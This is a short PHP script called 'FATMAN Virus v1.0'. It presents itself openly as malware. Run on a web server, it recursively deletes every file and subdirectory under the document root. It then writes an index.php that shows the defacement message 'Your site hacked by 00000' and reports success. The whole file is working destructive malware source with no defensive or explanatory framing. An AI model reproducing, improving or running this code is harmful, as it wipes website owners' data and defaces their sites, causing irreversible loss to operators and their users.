<?php
   /* 
      FATMAN Virus v1.0
      DVELOPED BY: REZWAN AHMOD SAMI.
   */
  $cur_dir = __DIR__;
  $root = $_SERVER['DOCUMENT_ROOT'];
   

   function clear_all($src, $root_dir  = ''){
      $dir= opendir($src);

      while (false !== ($file = readdir($dir))) {
         if (($file != '.') && ($file != '..')) {
         
         $full = $src.'/'.$file;

            if (is_dir($full)) {
                  clear_all($full);
            }else{
               // if ($file != 'fatman.php') {
                  unlink($full);
               // }
            }

         }
      }
      closedir($dir);
      if ($src != $root_dir) {
         rmdir($src);
      }
      return 1;
   }
   
   // you need  to  pass root  dir  here
   if (clear_all($root, $root)) {
      $deface_page  = 'Your  site hacked  by 00000';
      $f = fopen($root.'index.php', 'w');
      $write= fwrite($f, $deface_page);
      if ($write) {
         echo 'Operations  success!!';
      }else{
         echo 'failed to create defacepage';
      }
   }else{
      echo 'Failed to operation';
   }
?>